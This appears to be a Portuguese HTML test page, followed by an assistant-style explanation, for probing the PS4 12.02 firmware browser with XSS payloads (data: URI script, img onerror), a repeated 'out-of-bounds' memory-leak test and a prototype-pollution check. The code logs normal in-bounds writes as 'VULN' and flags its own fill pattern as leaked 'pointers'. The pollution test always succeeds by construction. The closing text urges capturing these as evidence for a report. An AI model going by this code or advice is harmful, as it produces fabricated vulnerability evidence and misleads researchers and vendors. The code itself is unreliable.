<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 FW 12.02 - Teste v10 (Info Leak Repetido)</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks genéricos */
        .log-ptr { color: #f0f; font-weight: bold; } /* Magenta para POTENCIAIS ponteiros */
        #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 40px; }
    </style>
</head>
<body>
    <h1>PS4 FW 12.02 - Teste v10 (Info Leak Repetido)</h1>
    <p>Testa: XSS, OOB Write/Read Repetido (Procura Ponteiros), PP Básica.</p>
    <button id="runBtn" onclick="runAllTests()">Iniciar Todos os Testes</button>
    <div id="output"></div>
    <div id="xss-target-div">Área para teste de XSS DOM.</div>

    <script>
        // --- Globals & Setup ---
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50; // ms
        const MEDIUM_PAUSE = 500; // ms
        const NUM_LEAK_ATTEMPTS = 5; // Número de vezes para repetir o Teste 2

        // --- Função de Log ---
        const log = (message, type = 'info') => {
             if (!outputDiv) return;
             try {
                 const timestamp = `[${new Date().toLocaleTimeString()}]`;
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                 if(outputDiv.innerHTML.length > 500000){
                     outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000);
                     outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
                 }
                 outputDiv.innerHTML += `<span class="log-${type}">${timestamp} ${sanitizedMessage}\n</span>`;
                 outputDiv.scrollTop = outputDiv.scrollHeight;
             } catch(e) { console.error("Erro na função log:", e); outputDiv = null; }
        };

        // Helper para formatar números como hex
        const toHex = (val, bits = 32) => {
             if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
             let num = Number(val);
             if (bits <= 32) { num = num >>> 0; }
             const pad = Math.ceil(bits / 4);
             return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
        }

        // --- Heurística Simples para Detetar Potenciais Ponteiros (64-bit) ---
        const isPotentialPointer64 = (high, low) => {
            if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
            if (high === 0 && low === 0) return false;
            if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Nosso padrão
            if (high === 0 && low < 0x100000) return false; // Valores muito pequenos
            // if (low % 8 !== 0) return false; // Alinhamento (opcional)
            return true;
        };

         // --- Heurística Simples para Detetar Potenciais Dados U32 ---
         const isPotentialData32 = (val) => {
             if (val === null || typeof val !== 'number') return false;
             val = val >>> 0;
             if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false;
             if (val < 0x1000) return false;
             return true;
         }

        // --- Teste 1: CSP Bypass / XSS ---
        // (Função testCSPBypass igual à versão anterior)
        const testCSPBypass = async () => {
            log("--- Iniciando Teste 1: CSP Bypass / XSS ---", 'test');
            // ... (código igual ao script v9) ...
            // 1.1 Teste com data: URI
            log("Tentando XSS via data: URI (alert)...", 'subtest');
            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
            try {
                const payloadJS = `try { alert('XSS via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln"); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good"); }`;
                const encodedPayload = btoa(payloadJS);
                const scriptTag = document.createElement('script');
                scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
                scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: URI!", 'error'); };
                document.body.appendChild(scriptTag);
                log("Tag <script> data: URI adicionada.", 'info');
            } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error'); }

            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2));

            // 1.2 Teste com onerror
            log("Tentando XSS DOM via inline handler (onerror)...", 'subtest');
            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
            try {
                const imgTag = document.createElement('img');
                imgTag.src = 'invalid_image_source_' + Date.now();
                const onerrorPayload = `
                    try {
                        const target = document.getElementById('xss-target-div');
                        if (target) {
                            target.innerHTML = '<h2 class="log-vuln">XSS DOM via ONERROR Executado!</h2>';
                            log("XSS DOM via onerror realizado!", "vuln");
                        } else { log("Alvo XSS DOM (onerror) não encontrado.", "error"); }
                        alert('XSS_DOM_ONERROR');
                    } catch(e) { log("Erro no payload onerror: " + e.message, "warn"); }
                `;
                imgTag.setAttribute('onerror', onerrorPayload);
                document.body.appendChild(imgTag);
                log("Tag <img> com onerror adicionada.", 'info');
            } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error'); }
            log("--- Teste 1 Concluído (Verificar alertas/DOM) ---", 'test');
        };


        // --- Teste 2: OOB Write/Read Repetido (Tentativa de Info Leak Aprimorada) ---
        // Executa a lógica de OOB Read/Write várias vezes
        const runRepeatedInfoLeakTest = async () => {
            log(`--- Iniciando Teste 2: OOB Write/Read Repetido (${NUM_LEAK_ATTEMPTS} tentativas) ---`, 'test');
            let totalLeaksFound = 0;

            for (let attempt = 1; attempt <= NUM_LEAK_ATTEMPTS; attempt++) {
                log(`--- Tentativa ${attempt}/${NUM_LEAK_ATTEMPTS} de Info Leak ---`, 'subtest');

                // Variar ligeiramente o tamanho do buffer em cada tentativa
                const bufferSize = 32 + (attempt * 4); // Ex: 36, 40, 44, ...
                const writeValue = 0xEE;
                const oobWriteOffset = 32; // Usar um offset de escrita OOB que funcionou antes
                const oobReadOffsets = [];
                for (let i = -64; i < bufferSize + 64; i += 4) { oobReadOffsets.push(i); }

                let writeSuccess = false;
                let potentialLeakFoundInAttempt = 0;
                let currentLeakedValue = null; // Leak por tentativa

                try {
                    // Usar um escopo de função para ajudar na limpeza (GC pode ser lento)
                    await (async function() {
                        const buffer = new ArrayBuffer(bufferSize + 256);
                        const dataView = new DataView(buffer);
                        const baseOffset = 128;
                        for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }

                        const writeTargetAddress = baseOffset + oobWriteOffset;
                        log(`  [Tentativa ${attempt}] Escrita OOB U8 @${oobWriteOffset} (buffer ${bufferSize}b)...`, 'info');
                        await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                        try {
                            dataView.setUint8(writeTargetAddress, writeValue);
                            log(`  [Tentativa ${attempt}] VULN: Escrita OOB permitida!`, 'vuln');
                            writeSuccess = true;
                        } catch (e) {
                            log(`  [Tentativa ${attempt}] BLOQUEADO: Escrita OOB impedida: ${e.message}`, 'good');
                            return; // Pula para a próxima tentativa se a escrita falhar
                        }

                        await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                        log(`  [Tentativa ${attempt}] Tentando leituras OOB U32/U64...`, 'info');
                        for (const readOffset of oobReadOffsets) {
                            const readTargetAddress = baseOffset + readOffset;
                            if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) continue;

                            try {
                                const low = dataView.getUint32(readTargetAddress, true);
                                const high = dataView.getUint32(readTargetAddress + 4, true);
                                if (isPotentialPointer64(high, low)) {
                                    const valueStr = `H=${toHex(high, 32)} L=${toHex(low, 32)}`;
                                    log(`  [Tentativa ${attempt}] -> POTENCIAL PONTEIRO? U64 @${readOffset}: ${valueStr}`, 'ptr');
                                    potentialLeakFoundInAttempt++;
                                    if (currentLeakedValue === null) currentLeakedValue = valueStr;
                                } else {
                                    const val32 = low; // Reusa o low para verificar U32
                                    if (isPotentialData32(val32)) {
                                        log(`  [Tentativa ${attempt}] -> Leak U32? @${readOffset}: ${toHex(val32, 32)}`, 'leak');
                                        potentialLeakFoundInAttempt++;
                                        if (currentLeakedValue === null) currentLeakedValue = toHex(val32, 32);
                                    }
                                }
                            } catch (e) {/* Ignora falha */}
                            if (readOffset % 64 === 0) await new Promise(resolve => setTimeout(resolve, 1)); // Pausa curta
                        } // Fim loop leitura OOB
                    })(); // Fim da função de escopo

                } catch (e) { log(`  [Tentativa ${attempt}] Erro inesperado: ${e.message}`, 'error'); }

                log(`--- Fim da Tentativa ${attempt}: ${potentialLeakFoundInAttempt} potenciais leaks encontrados. ---`, 'subtest');
                totalLeaksFound += potentialLeakFoundInAttempt;
                // Pausa entre tentativas para permitir alguma variação de memória/GC
                await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));

            } // Fim loop de tentativas

            log(`--- Teste 2 Concluído (Total de ${totalLeaksFound} potenciais leaks encontrados em ${NUM_LEAK_ATTEMPTS} tentativas) ---`, 'test');
            return totalLeaksFound > 0;
        };


        // --- Teste 3: Prototype Pollution (Básica) ---
        // (Função testBasicPP igual à versão anterior)
        const testBasicPP = async () => {
            log("--- Iniciando Teste 3: Prototype Pollution (Básica) ---", 'test');
            // ... (código igual ao script v9) ...
             const testProp = '__pp_basic_test__';
            const testValue = 'Polluted!';
            let success = false;
            try {
                log(`Poluindo Object.prototype.${testProp} = "${testValue}"`, 'subtest');
                Object.prototype[testProp] = testValue;
                log("Verificando herança em objeto vazio {}...", 'subtest');
                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                const obj = {};
                if (obj[testProp] === testValue) {
                    log(`VULN: PP Básica confirmada! Objeto vazio herdou a propriedade.`, 'vuln');
                    success = true;
                } else {
                    log(`FALHA: PP Básica não confirmada. Objeto vazio NÃO herdou a propriedade.`, 'good');
                }
            } catch (e) { log(`Erro durante teste PP Básico: ${e.message}`, 'error'); }
            finally {
                try { delete Object.prototype[testProp]; } catch(e){}
                log(`Limpeza de Object.prototype.${testProp} realizada.`, 'info');
            }
            log(`--- Teste 3 Concluído (PP Básica ${success ? 'Confirmada' : 'Falhou'}) ---`, 'test');
            return success;
        };

        // --- Função Principal para Rodar Todos os Testes ---
        const runAllTests = async () => {
            if (runBtn) runBtn.disabled = true;
            log("==== INICIANDO TODOS OS TESTES COMBINADOS v10 (Info Leak Repetido) ====", 'critical');

            await testCSPBypass(); // Teste 1
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));

            await runRepeatedInfoLeakTest(); // Teste 2 (Repetido)
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));

            await testBasicPP(); // Teste 3
            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));

            // Removido PP Hijack para focar no Info Leak repetido

            log("\n==== TODOS OS TESTES COMBINADOS v10 CONCLUÍDOS ====", 'critical');
            if (runBtn) runBtn.disabled = false;
        };

        // document.addEventListener('DOMContentLoaded', runAllTests);
    </script>

</body>
</html>
```

**O que esperar:**

* O script executará o Teste 2 (OOB Write/Read) `NUM_LEAK_ATTEMPTS` vezes (definido como 5 no código, pode ajustar).
* Cada tentativa usará um tamanho de buffer ligeiramente diferente.
* O log mostrará os resultados de cada tentativa separadamente.
* **Observe atentamente** se alguma das tentativas consegue encontrar e logar valores marcados como `POTENCIAL PONTEIRO?` (magenta) ou `Leak U32?` (laranja).
* O objetivo é que, ao repetir o teste, a probabilidade de encontrar um leak interessante aumente devido às possíveis variações no estado da memória entre as tentativas.

Se alguma das tentativas mostrar um "potencial ponteiro" claro, capture essa parte do log no seu vídeo e relatório. Isso pode ser a evidência mais forte que conseguimos gerar para o Info Le
